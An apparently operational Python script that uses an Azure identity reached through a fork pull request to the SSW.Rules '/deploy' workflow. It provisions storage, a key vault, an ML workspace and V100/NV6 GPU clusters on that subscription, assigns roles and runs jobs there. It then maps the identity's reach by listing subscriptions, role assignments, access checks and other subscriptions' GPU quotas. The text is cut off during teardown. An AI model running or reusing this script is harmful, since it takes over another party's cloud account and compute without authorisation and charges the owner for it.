#!/usr/bin/env python3
"""C211-I126069: grant()-FIXED AML AmlCompute TRAINING-compute GPU probe on
subscription b8b18dcf (SSW.Rules '/deploy' fork-PR ARM identity): V100 first
(Standard_NC6s_v3), one verbatim-refusal fallback to NV6 (Standard_NV6).

Own-code defect being repaired (x125603 -> x125698 fact 125725): the prior probe
built every ARM resource URL WITHOUT the mandatory '/providers' segment, e.g.
  /subscriptions/<sid>/resourceGroups/SSW.Rules.Staging/Microsoft.Storage/storageAccounts/<name>
so storage PUT api-version 2023-01-01 and workspace PUT 2024-10-01 returned HTTP 400
InvalidApiVersionParameter, and the repaired re-fire returned HTTP 404 "No HTTP resource
was found".  The proven x121794 READY (T4, same subscription, same '/deploy' vehicle)
used exactly:
  base = ARM + /subscriptions/<sid>/resourceGroups/<RG> + "/providers"
and every URL here carries that segment.  api-versions are additionally verified
against the live RP metadata endpoint /subscriptions/<sid>/providers/<ns> before use.

Plan: read the AML quota oracle (Microsoft.MachineLearningServices locations/<r>/usages)
for 16 regions verbatim; pick an on-demand (Dedicated) region with standardNCSv3Family
limit>0 (westeurope/westus hold 12 free); create ONE nonce storage account + ONE nonce
key vault + ONE nonce workspace + ONE AmlCompute cluster Standard_NC6s_v3 (1 x V100 16GB,
min0/max1, Dedicated) + ONE Command job whose inline script prints nvidia-smi -L and
nvidia-smi --query-gpu=name,uuid,memory.total,driver_version and uploads it through an
account SAS to the sink blob; independent ARM readback; then a single on-demand NV6
(Standard_NV6, M60) fallback ONLY if the V100 cluster attempt is refused or its job
produces no device line; full teardown (job -> cluster -> workspace -> key vault ->
storage) with GET 404 / list-absent proof.  Exactly one probe fire.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import uuid
import urllib.error
import urllib.parse
import urllib.request

TAG = "C211_I126069"
ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
NONCE = "i126069"
SUF = hashlib.sha256(NONCE.encode()).hexdigest()[:8]
WS = "c211i126069aml"
CLUSTERS = [("c211-i126069-v100", "Standard_NC6s_v3", "v100"),
            ("c211-i126069-nv6", "Standard_NV6", "nv6")]
JOB_V = "c211-i126069-dev"
JOB_N = "c211-i126069-nvdev"
ENVNAME = "c211-i126069-cuda"
OUTNAME = "c211out"
IMG = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
ROLE_SBLOB = "ba92f5b4-2d11-453d-a403-e96b0029c9fe"
# api-versions are re-verified live from the RP metadata before any use
VER = {"stg": "2024-11-01", "kv": "2023-07-01", "aml": "2024-10-01",
       "compute": "2024-04-01", "usage": "2024-04-01"}
T0 = time.time()
DEADLINE = 5400

REGIONS = ["westeurope", "westus", "eastus", "westus2", "australiaeast",
           "northeurope", "eastus2", "centralus", "uksouth", "southeastasia",
           "japaneast", "canadacentral", "swedencentral", "germanywestcentral",
           "italynorth", "southcentralus"]


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print((TAG + " " + json.dumps(obj, default=str))[:3800], flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=300):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": (p.stderr or "")[-800:]}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def armh(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            h = {k.lower(): v for k, v in r.headers.items()}
            h.pop("authorization", None)
            try:
                return r.status, json.loads(raw), h
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}, h
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        h = {k.lower(): v for k, v in e.headers.items()}
        try:
            return e.code, json.loads(raw or "{}"), h
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1500]}, h
    except Exception as e:  # noqa: BLE001
        return -1, {"error": repr(e)}, {}


def arm(tok, url, method="GET", body=None, timeout=120):
    st, b, _h = armh(tok, url, method, body, timeout)
    return st, b


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception:  # noqa: BLE001
        return -1, b""


def err_of(st, body):
    if st in (200, 201, 202):
        return {"http": st}
    code = msg = details = None
    if isinstance(body, dict):
        e = body.get("error") if isinstance(body.get("error"), dict) else body
        code = e.get("code")
        msg = e.get("message")
        details = json.dumps(e.get("details"))[:500] if e.get("details") else None
    return {"http": st, "code": code, "message": (msg or "")[:800], "details": details}


def prov_state(body):
    if not isinstance(body, dict):
        return None
    p = body.get("properties") if isinstance(body.get("properties"), dict) else {}
    return p.get("provisioningState") or body.get("provisioningState")


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=6):
    sv = "2022-11-02"
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def grant(tok, sid, scope_id, principal, role, label):
    """6-arg signature copied verbatim from the proven x121794 probe_v4 / x125825
    reference; the x125851 defect was a 5-arg definition called with 6 args."""
    ra = str(uuid.uuid4())
    url = (ARM + scope_id + "/providers/Microsoft.Authorization/roleAssignments/" + ra +
           "?api-version=2022-04-01")
    body = {"properties": {
        "roleDefinitionId": "/subscriptions/%s/providers/Microsoft.Authorization/"
                            "roleDefinitions/%s" % (sid, role),
        "principalId": principal, "principalType": "ServicePrincipal"}}
    st, b = arm(tok, url, "PUT", body, timeout=90)
    emit({"step": "role-assign", "label": label, "http": st,
          "code": (b.get("error", {}) or {}).get("code") if isinstance(b, dict) else None})
    return st


def pick_versions(tok, sid):
    """Verify every api-version against the live RP metadata endpoint."""
    want = {"Microsoft.Storage": [("storageAccounts", "stg", "2024-11-01")],
            "Microsoft.KeyVault": [("vaults", "kv", "2023-07-01")],
            "Microsoft.MachineLearningServices": [
                ("workspaces", "aml", "2024-10-01"),
                ("workspaces/computes", "compute", "2024-04-01"),
                ("locations/usages", "usage", "2024-04-01")]}
    for ns, items in want.items():
        st, b = arm(tok, ARM + "/subscriptions/" + sid + "/providers/" + ns +
                    "?api-version=2021-04-01", timeout=90)
        rts = {}
        if isinstance(b, dict):
            for rt in b.get("resourceTypes") or []:
                rts[str(rt.get("resourceType", "")).lower()] = rt.get("apiVersions") or []
        for rt, key, prefer in items:
            vs = rts.get(rt.lower()) or []
            stable = [v for v in vs if re.match(r"^\d{4}-\d{2}-\d{2}$", v)]
            picked = prefer if prefer in vs else (stable[0] if stable else (vs[0] if vs else None))
            if picked:
                VER[key] = picked
            emit({"step": "ver-metadata", "ns": ns, "rt": rt, "http": st,
                  "n": len(vs), "picked": VER[key], "top": vs[:6]})
    # runtime acceptance probe of the exact URI shapes that failed before
    for key, url in (
        ("stg", lambda: ARM + "/subscriptions/" + sid + "/providers/Microsoft.Storage/"
         "storageAccounts?api-version=" + VER["stg"]),
        ("aml", lambda: ARM + "/subscriptions/" + sid + "/providers/"
         "Microsoft.MachineLearningServices/workspaces?api-version=" + VER["aml"]),
        ("kv", lambda: ARM + "/subscriptions/" + sid + "/providers/Microsoft.KeyVault/"
         "vaults?api-version=" + VER["kv"])):
        st, b = arm(tok, url(), timeout=90)
        code = ((b.get("error") or {}).get("code") if isinstance(b, dict) else None)
        emit({"step": "ver-accept", "rp": key, "http": st, "code": code,
              "v": VER[key]})


def emit_summary(summary):
    raw = json.dumps(summary, default=str).encode()
    blob = base64.b64encode(raw).decode()
    n = (len(blob) + 2999) // 3000
    emit({"step": "SUMMARY-META", "n": n, "bytes": len(raw)})
    for i in range(n):
        emit({"step": "SUMMARY-PART-B64", "i": i, "n": n,
              "part": blob[i * 3000:(i + 1) * 3000]})
    emit({"step": "SUMMARY", "summary": summary})


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
    except Exception:  # noqa: BLE001
        emit({"step": "fatal", "why": "no az session", "raw": r["out"][:300]})
        emit({"step": "PROBE-EXIT", "code": 1})
        return
    sid = acc.get("id")
    tenant = acc.get("tenantId")
    emit({"step": "identity", "sub_len": len(sid or ""), "name": acc.get("name"),
          "state": acc.get("state"), "tenant_len": len(tenant or "")})
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"],
            timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not sid or not tok:
        emit({"step": "PROBE-EXIT", "code": 1})
        return

    base = ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG + "/providers"
    rbase = base[len(ARM):]
    summary = {"tag": TAG, "nonce": NONCE, "quota": {}, "plan": {},
               "cluster": [], "job": [], "device": {}, "teardown": {},
               "identity": {"sub_len": len(sid), "name": acc.get("name")},
               "versions": dict(VER), "rg": base}
    emit({"step": "base", "base": base.replace(sid, "<sid>")})

    # ---------- A. live api-version verification ----------
    pick_versions(tok, sid)
    summary["versions"] = dict(VER)

    # ---------- B. AML quota oracle (training-compute quotas) ----------
    for reg in REGIONS:
        u = (ARM + "/subscriptions/" + sid + "/providers/Microsoft.MachineLearningServices"
             "/locations/" + reg + "/usages?api-version=" + VER["usage"])
        st, b = arm(tok, u, timeout=90)
        fam = {}
        for m in ((b.get("value") or []) if isinstance(b, dict) else []):
            nm = ((m.get("name") or {}).get("value") or "")
            fam[nm] = {"limit": m.get("limit"), "current": m.get("currentValue")}
        summary["quota"][reg] = {"http": st, "n": len(fam),
                                 "v100": fam.get("standardNCSv3Family"),
                                 "nv": fam.get("standardNVFamily"),
                                 "t4": fam.get("Standard NCASv3_T4 Family")}
        emit({"step": "aml-usage", "region": reg, "http": st,
              "v100": fam.get("standardNCSv3Family"), "nv": fam.get("standardNVFamily")})

    def lim(reg, key):
        v = summary["quota"].get(reg, {}).get(key) or {}
        try:
            l0 = int(v.get("limit"))
            c0 = int(v.get("current") or 0)
            return -1 if l0 < 0 else l0 - c0      # AML sentinel: limit<0 = unlimited
        except Exception:  # noqa: BLE001
            return 0

    v100_regions = [r0 for r0 in REGIONS if lim(r0, "v100") >= 6 or lim(r0, "v100") == -1]
    nv_regions = [r0 for r0 in REGIONS if lim(r0, "nv") >= 6 or lim(r0, "nv") == -1]
    pick_v = ("westeurope" if "westeurope" in v100_regions else
              (v100_regions[0] if v100_regions else "westeurope"))
    pick_n = ("westeurope" if "westeurope" in nv_regions else
              (nv_regions[0] if nv_regions else "westeurope"))
    summary["plan"] = {"v100_regions": v100_regions, "nv_regions": nv_regions,
                       "v100_region": pick_v, "nv_region": pick_n}
    emit({"step": "region-plan", "v100_regions": v100_regions,
          "nv_regions": nv_regions, "v100": pick_v, "nv": pick_n})
    # ---------- B2. live SKU availability (Compute skus filtered by region) ----------
    def vm_offered(reg, sku):
        flt = urllib.parse.quote("location eq '%s'" % reg)
        st, sk = arm(tok, ARM + "/subscriptions/" + sid +
                     "/providers/Microsoft.Compute/skus?api-version=2021-07-01&$filter=" + flt,
                     timeout=90)
        if not isinstance(sk, dict):
            return st, None
        for s in sk.get("value") or []:
            if str(s.get("name", "")).lower() != sku.lower():
                continue
            locs = [str(x).lower() for x in (s.get("locations") or [])]
            na = False
            for r0 in (s.get("restrictions") or []):
                vals = [str(v).lower() for v in (r0.get("values") or [])]
                if str(r0.get("type")).lower() == "location" and reg.lower() in vals:
                    na = True
            return st, {"present": True, "locations": locs[:10], "restricted_here": na,
                        "restriction_count": len(s.get("restrictions") or [])}
        return st, {"present": False}

    sku_checks = []
    pick_v2, pick_n2 = None, None
    for key, sku, cands, cur_pick in (("v100", "Standard_NC6s_v3", v100_regions, pick_v),
                                      ("nv6", "Standard_NV6", nv_regions, pick_n)):
        order = [cur_pick] + [r0 for r0 in cands if r0 != cur_pick]
        for reg in order[:4]:
            st, info = vm_offered(reg, sku)
            rec = {"key": key, "sku": sku, "region": reg, "http": st,
                   "info": info}
            sku_checks.append(rec)
            emit({"step": "sku-check", **rec})
            if info and info.get("present") and not info.get("restricted_here"):
                if key == "v100" and pick_v2 is None:
                    pick_v2 = reg
                if key == "nv6" and pick_n2 is None:
                    pick_n2 = reg
                break
    if pick_v2:
        pick_v = pick_v2
    if pick_n2:
        pick_n = pick_n2
    summary["sku_checks"] = sku_checks
    summary["plan"].update({"v100_region_final": pick_v, "nv6_region_final": pick_n,
                            "v100_sku_verified": bool(pick_v2),
                            "nv6_sku_verified": bool(pick_n2)})
    emit({"step": "region-plan-final", "v100": pick_v, "nv6": pick_n,
          "v100_sku_verified": bool(pick_v2), "nv6_sku_verified": bool(pick_n2)})
    loc = pick_v

    # ---------- C. providers + rg context ----------
    st, b = arm(tok, ARM + "/subscriptions/" + sid + "/providers?api-version=2021-04-01")
    states = {}
    if isinstance(b, dict):
        m = {str(x.get("namespace")).lower(): x.get("registrationState")
             for x in (b.get("value") or []) if isinstance(x, dict)}
        for w in ("Microsoft.MachineLearningServices", "Microsoft.Storage",
                  "Microsoft.KeyVault", "Microsoft.Authorization"):
            states[w] = m.get(w.lower())
    emit({"step": "providers", "http": st, "states": states})
    summary["providers"] = states

    # ---------- D. dependencies: storage + SAS sink, key vault, appi ----------
    own = {}
    sas = None
    sa = ("c211i126069" + SUF).lower()[:24]
    own["sa"] = sa
    saurl = base + "/Microsoft.Storage/storageAccounts/" + sa + \
        "?api-version=" + VER["stg"]
    st, b = arm(tok, saurl, "PUT",
                {"location": loc, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
                 "tags": {"c211": NONCE},
                 "properties": {"allowBlobPublicAccess": False,
                                "minimumTlsVersion": "TLS1_2",
                                "supportsHttpsTrafficOnly": True,
                                "networkAcls": {"bypass": "AzureServices",
                                                "defaultAction": "Allow"}}}, timeout=240)
    emit({"step": "sa-create", "name": sa, "url": saurl.replace(sid, "<sid>"),
          **err_of(st, b)})
    summary["sa_create"] = {"name": sa, "url": saurl.replace(sid, "<sid>"),
                            **err_of(st, b)}
    if st in (200, 201, 202):
        for _ in range(24):
            stp, bp = arm(tok, saurl, timeout=60)
            if prov_state(bp) in ("Succeeded", "Failed"):
                break
            time.sleep(10)
        st, kb = arm(tok, base + "/Microsoft.Storage/storageAccounts/" + sa +
                     "/listKeys?api-version=" + VER["stg"], "POST", {}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit({"step": "sa-keys", "http": st, "got": bool(key)})
        summary["sa_keys"] = {"http": st, "got": bool(key)}
        if key:
            q, se = sa_sas(sa, key)
            bbase = "https://" + sa + ".blob.core.windows.net"
            stc, bc = httptext(bbase + "/c211?restype=container&" + q, method="PUT")
            emit({"step": "sa-container", "http": stc,
                  "body": bc[:120].decode("utf-8", "replace")})
            if stc in (201, 409):
                sas = bbase + "/c211/" + NONCE + "-out.txt?" + q
                emit({"step": "sa-sas", "ok": True, "expires": se})

    kv = "c211i126069kv" + SUF[:4]
    kvurl = base + "/Microsoft.KeyVault/vaults/" + kv + "?api-version=" + VER["kv"]
    st, b = arm(tok, kvurl, "PUT",
                {"location": loc, "tags": {"c211": NONCE},
                 "properties": {"tenantId": tenant,
                                "sku": {"family": "A", "name": "standard"},
                                "accessPolicies": [], "enableSoftDelete": True,
                                "enableRbacAuthorization": True}}, timeout=180)
    emit({"step": "kv-create", "name": kv, **err_of(st, b)})
    summary["kv_create"] = {"name": kv, **err_of(st, b)}
    kv_id = (rbase + "/Microsoft.KeyVault/vaults/" + kv) if st in (200, 201, 202) else None
    if kv_id:
        own["kv"] = kv
        for _ in range(18):
            stp, bp = arm(tok, kvurl, timeout=60)
            if prov_state(bp) in ("Succeeded", "Failed"):
                break
            time.sleep(10)

    appi_id = None
    st, rl = arm(tok, ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                 "/resources?api-version=2021-04-01")
    for x in ((rl.get("value") or []) if isinstance(rl, dict) else []):
        if (x.get("type") or "").lower() == "microsoft.insights/components" and not appi_id:
            appi_id = x.get("id")
    emit({"step": "appi-reuse", "id_ok": bool(appi_id), "http": st})

    # ---------- E. workspace (async-op capture) ----------
    wurl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + \
        "?api-version=" + VER["aml"]
    props = {"friendlyName": "c211-i126069 nonce workspace", "hbiWorkspace": False,
             "v1LegacyMode": False,
             "storageAccount": rbase + "/Microsoft.Storage/storageAccounts/" + sa}
    if kv_id:
        props["keyVault"] = kv_id
    if appi_id:
        props["applicationInsights"] = appi_id
    wbody = {"location": loc, "tags": {"c211": NONCE},
             "identity": {"type": "SystemAssigned"},
             "sku": {"name": "Basic", "tier": "Basic"}, "properties": props}
    st, b, hdrs = armh(tok, wurl, "PUT", wbody, timeout=300)
    async_url = hdrs.get("azure-asyncoperation") or hdrs.get("location")
    emit({"step": "ws-create", "url": wurl.replace(sid, "<sid>"), **err_of(st, b),
          "async_op": (async_url or "").replace(sid, "<sid>")})
    summary["ws_create"] = {"url": wurl.replace(sid, "<sid>"), **err_of(st, b)}
    ws_state = None
    if st in (200, 201, 202):
        own["ws"] = WS
        t0 = time.time()
        while time.time() - t0 < 600:
            if async_url:
                ast, ab = arm(tok, async_url, timeout=90)
                async_state = ((ab.get("status") or
                                (ab.get("properties") or {}).get("status"))
                               if isinstance(ab, dict) else None)
            rst, rb = arm(tok, wurl, timeout=90)
            ws_state = prov_state(rb)
            emit({"step": "ws-poll", "http": rst, "state": ws_state, "t": round(time.time() - t0)})
            if ws_state in ("Succeeded", "Failed", "Canceled"):
                break
            time.sleep(15)
        summary["ws_state"] = ws_state

    device = {"found": False, "uuid": None, "text": "", "sku": None, "cluster": None}
    if ws_state == "Succeeded":
        wsu = rbase + "/Microsoft.MachineLearningServices/workspaces/" + WS
        st, wb = arm(tok, wurl, timeout=90)
        msi = (((wb.get("identity") or {}).get("principalId")) if isinstance(wb, dict) else None)
        emit({"step": "ws-readback", "http": st, "state": prov_state(wb),
              "msi": (msi or "")[:8] + "***"})
        if msi and sas:
            grant(tok, sid, rbase + "/Microsoft.Storage/storageAccounts/" + sa,
                  msi, ROLE_SBLOB, "ws-msi-blob")
        eu = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + \
            "/environments/" + ENVNAME + "/versions/1?api-version=" + VER["aml"]
        st, eb = arm(tok, eu, "PUT", {"properties": {"image": IMG, "osType": "Linux",
                                                    "description": "c211 i126069 cuda"}},
                     timeout=120)
        env_id = ((wsu + "/environments/" + ENVNAME + "/versions/1")
                  if st in (200, 201) else None)
        emit({"step": "env-version", "http": st, "id_ok": bool(env_id),
              **({} if st in (200, 201) else err_of(st, eb))})
        summary["env"] = {"http": st, "id_ok": bool(env_id)}

        cmd = ("echo C211_I126069_DEV_START; "
               "OUT=\"${{outputs.%s}}\"; mkdir -p \"$OUT\" 2>/dev/null || OUT=.; "
               "(nvidia-smi -L 2>&1 || echo NO_NVIDIA_SMI) | tee \"$OUT/device.txt\"; "
               "(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version "
               "--format=csv 2>&1 || true) | tee -a \"$OUT/device.txt\"; "
               "echo C211_I126069_DEV_END" % OUTNAME)
        if sas:
            cmd += ("; if command -v curl >/dev/null 2>&1; then "
                    "curl -sS -X PUT '%s' -H 'x-ms-blob-type: BlockBlob' "
                    "-H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' "
                    "--data-binary @\"$OUT/device.txt\"; echo C211_UPLOAD_CURL_RC=$?; "
                    "fi; echo C211_UPLOAD_DONE" % sas)
        outputs = {OUTNAME: {"jobOutputType": "uri_folder", "mode": "ReadWriteMount"}}

        def poll_job(name, budget, tag):
            jurl = (base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                    "/jobs/" + name + "?api-version=" + VER["aml"])
            t0 = time.time()
            final = {}
            txt = None
            while time.time() - t0 < budget:
                time.sleep(15)
                stj, jjb = arm(tok, jurl, timeout=90)
                jp = (jjb.get("properties") or {}) if isinstance(jjb, dict) else {}
                pr = jp.get("properties") if isinstance(jp.get("properties"), dict) else {}
                final = {"http": stj, "status": jp.get("status"),
                         "nested": pr.get("status"), "error": jp.get("error"),
                         "nested_error": pr.get("error"), "computeId": jp.get("computeId")}
                emit({"step": tag + "-job-poll", "t": round(time.time() - t0),
                      **{k: (str(v)[:300] if v else v) for k, v in final.items()}})
                if txt is None and sas:
                    sb, bb = httptext(sas, timeout=30)
                    if sb == 200:
                        txt = bb.decode("utf-8", "replace")
                        emit({"step": tag + "-blob-read", "http": sb, "len": len(txt),
                              "has_uuid": bool(re.search(r"GPU-[0-9a-fA-F-]{16,}", txt)),
                              "text": txt[:1500]})
                if txt and re.search(r"GPU-[0-9a-fA-F-]{16,}", txt):
                    break
                if final["status"] in ("Completed", "Failed", "Canceled") or \
                        final["nested"] in ("Completed", "Failed", "Canceled"):
                    break
            if txt is None and sas:
                sb, bb = httptext(sas, timeout=30)
                if sb == 200:
                    txt = bb.decode("utf-8", "replace")
                    emit({"step": tag + "-blob-read-final", "http": sb, "len": len(txt),
                          "text": txt[:1500]})
            stj, rb2 = arm(tok, jurl, timeout=90)
            jb2 = (rb2.get("properties") or {}) if isinstance(rb2, dict) else {}
            pr2 = jb2.get("properties") if isinstance(jb2.get("properties"), dict) else {}
            emit({"step": tag + "-readback", "http": stj, "status": jb2.get("status"),
                  "nested": pr2.get("status"), "error": jb2.get("error"),
                  "nested_error": pr2.get("error"), "computeId": jb2.get("computeId")})
            return final, (txt or "")

        # ---------- F. cluster ladder: V100 Dedicated then NV6 Dedicated ----------
        attempts = [("v100", CLUSTERS[0][0], CLUSTERS[0][1], pick_v, JOB_V),
                    ("nv6", CLUSTERS[1][0], CLUSTERS[1][1], pick_n, JOB_N)]
        for key, cname, sku, region, jname in attempts:
            if key == "nv6" and device["found"]:
                break
            if left() < 900:
                emit({"step": "ladder-skip", "key": key, "why": "budget", "left": round(left())})
                break
            cloc = region
            curl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + \
                "/computes/" + cname + "?api-version=" + VER["compute"]
            cb = {"location": cloc, "tags": {"c211": NONCE},
                  "properties": {"computeType": "AmlCompute", "computeLocation": cloc,
                                 "description": "c211 i126069 bounded Dedicated %s probe" % key,
                                 "properties": {"vmSize": sku, "vmPriority": "Dedicated",
                                                "scaleSettings": {
                                                    "minNodeCount": 0,
                                                    "maxNodeCount": 1,
                                                    "nodeIdleTimeBeforeScaleDown": "PT2M"},
                                                "osType": "Linux",
                                                "remoteLoginPortPublicAccess": "Disabled"}}}
            st, b = arm(tok, curl, "PUT", cb, timeout=240)
            rec = {"key": key, "cluster": cname, "sku": sku, "region": cloc,
                   "priority": "Dedicated", "create": err_of(st, b),
                   "url": curl.replace(sid, "<sid>")}
            emit({"step": "cluster-create", "key": key, "sku": sku, "region": cloc,
                  **err_of(st, b)})
            summary["cluster"].append(rec)
            cluster_state = None
            if st in (200, 201, 202):
                own.setdefault("clusters", []).append(cname)
                t0 = time.time()
                while time.time() - t0 < 600:
                    time.sleep(15)
                    stp, bp = arm(tok, curl, timeout=90)
                    cluster_state = prov_state(bp)
                    pp = (bp.get("properties") or {}).get("properties") \
                        if isinstance(bp, dict) else {}
                    emit({"step": "cluster-poll", "key": key, "http": stp,
                          "state": cluster_state, "t": round(time.time() - t0),
                          "nodes": ((bp.get("properties") or {}).get("currentNodeCount")
                                    if isinstance(bp, dict) else None),
                          "errors": (json.dumps(pp.get("errors"))[:400]
                                     if isinstance(pp, dict) and pp.get("errors") else None)})
                    if cluster_state in ("Succeeded", "Failed", "Canceled"):
                        break
                rec["state"] = cluster_state
                if cluster_state != "Succeeded":
                    pp = ((b.get("properties") or {}).get("properties")
                          if isinstance(b, dict) else {})
                    rec["cluster_errors"] = (json.dumps(pp.get("errors"))[:600]
                                             if isinstance(pp, dict) and pp.get("errors") else None)
            if cluster_state == "Succeeded":
                jurl = (base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                        "/jobs/" + jname + "?api-version=" + VER["aml"])
                jp = {"jobType": "Command", "displayName": jname,
                      "experimentName": "c211-i126069",
                      "description": "c211 i126069 amlcompute %s device probe" % key,
                      "command": cmd,
                      "computeId": (rbase + "/Microsoft.MachineLearningServices/workspaces/" +
                                    WS + "/computes/" + cname),
                      "resources": {"instanceCount": 1},
                      "outputs": outputs}
                if env_id:
                    jp["environmentId"] = env_id
                st, jb = arm(tok, jurl, "PUT", {"properties": jp}, timeout=180)
                emit({"step": "job-create-" + key, **err_of(st, jb)})
                jrec = {"key": key, "job": jname, "create": err_of(st, jb)}
                if st in (200, 201):
                    own.setdefault("jobs", []).append(jname)
                    final, txt = poll_job(jname, min(1200, max(240, left() - 800)), key)
                    uu = re.findall(r"GPU-[0-9a-fA-F-]{16,}", txt or "")
                    jrec.update({"final": {k: str(v)[:400] if v else v
                                           for k, v in final.items()},
                                 "device_text": (txt or "")[:1500],
                                 "uuids": uu[:4]})
                    if uu and not device["found"]:
                        device = {"found": True, "uuid": uu[0], "text": txt,
                                  "sku": sku, "cluster": cname}
                summary["job"].append(jrec)
    else:
        emit({"step": "ws-not-created", "state": ws_state})

    summary["device"] = device

    # ---------- F2. READ-ONLY ARM blast-radius measurement (<= 10 calls) ----------
    def blast_radius():
        out = {}
        n_calls = 0
        st, subs = arm(tok, ARM + "/subscriptions?api-version=2022-12-01", timeout=90)
        n_calls += 1
        vis = []
        if isinstance(subs, dict):
            for s in subs.get("value") or []:
                vis.append({"id": s.get("id"), "name": s.get("displayName"),
                            "state": s.get("state")})
        out["subscriptions"] = {"http": st, "n": len(vis),
                                "items": [{"id": (x["id"] or ""), "name": x["name"],
                                           "state": x["state"]} for x in vis[:10]]}
        emit({"step": "arm-subscriptions", "http": st, "n": len(vis),
              "items": [{"id_tail": (x["id"] or "")[-36:], "state": x["state"]}
                        for x in vis[:10]]})
        ra_url = (ARM + "/subscriptions/" + sid +
                  "/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")
        st2, ra = arm(tok, ra_url, timeout=90)
        n_calls += 1
        rows = []
        if isinstance(ra, dict):
            for r0 in (ra.get("value") or [])[:60]:
                pp = r0.get("properties") or {}
                rows.append({"role": (pp.get("roleDefinitionId") or "").split("/")[-1],
                             "principalId": (pp.get("principalId") or "")[:8] + "***",
                             "principalType": pp.get("principalType"),
                             "scope": (r0.get("id") or "").split("/providers/")[0][-90:]})
        out["role_assignments"] = {"http": st2, "n": len(rows), "sample": rows[:20],
                                   "roles": sorted({x["role"] for x in rows})[:20]}
        emit({"step": "arm-role-assignments", "http": st2, "n": len(rows),
              "roles": sorted({x["role"] for x in rows})[:20]})
        ca_url = (ARM + "/subscriptions/" + sid +
                  "/providers/Microsoft.Authorization/checkAccess"
                  "?api-version=2018-09-01-preview")
        st3, ca = arm(tok, ca_url, "POST",
                      {"Actions": ["Microsoft.Authorization/*"]}, timeout=90)
        n_calls += 1
        acc = []
        if isinstance(ca, dict):
            for a in ca.get("value") or []:
                acc.append({"action": a.get("action") or a.get("Action"),
                            "access": a.get("access") or a.get("Access")})
        out["check_access"] = {"http": st3, "value": acc[:10],
                               "code": ((ca.get("error") or {}).get("code")
                                        if isinstance(ca, dict) else None)}
        emit({"step": "arm-check-access", "http": st3, "value": acc[:10],
              "code": out["check_access"]["code"]})
        leads = []
        for s in vis:
            if n_calls >= 10:
                break
            ssid = s.get("id") or ""
            if sid.lower() in ssid.lower() or s.get("state") != "Enabled":
                continue
            stq, q = arm(tok, ARM + ssid +
                         "/providers/Microsoft.MachineLearningServices/locations/"
                         "westeurope/usages?api-version=2024-04-01", timeout=90)
            n_calls += 1
            fam = {}
            for m in ((q.get("value") or []) if isinstance(q, dict) else []):
                nm = ((m.get("name") or {}).get("value") or "")
                if nm in ("standardNCSv3Family", "standardNVFamily",
                          "Standard NCASv3_T4 Family", "standardNCFamily"):
                    fam[nm] = {"limit": m.get("limit"),
                               "current": m.get("currentValue")}
            leads.append({"sub": ssid, "http": stq, "fam": fam})
            emit({"step": "other-sub-quota", "sub": ssid, "http": stq, "fam": fam})
        out["other_sub_quota"] = leads
        out["n_calls"] = n_calls
        summary["blast_radius"] = out

    blast_radius()

    # ---------- G. teardown + absence ----------
    def del_and_wait(url, label, budget=300):
        st, b = arm(tok, url, "DELETE", timeout=180)
        emit({"step": label + "-delete", **err_of(st, b)})
        t0 = time.time()
        last = st
        while time.time() - t0 < budget:
            time.sleep(10)
            stp, bp = arm(tok, url, timeout=60)
            last = stp
            if stp == 404:
                break
        emit({"step": label + "-absence", "final_http": last})
        summary["teardown"][label] = {"delete_http": st, "final_http": last}

    for jname in own.get("jobs", []):
        del_and_wait(base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                     "/jobs/" + jname + "?api-version=" + VER["aml"], "job-" + jname, 240)
    for cname in own.get("clusters", []):
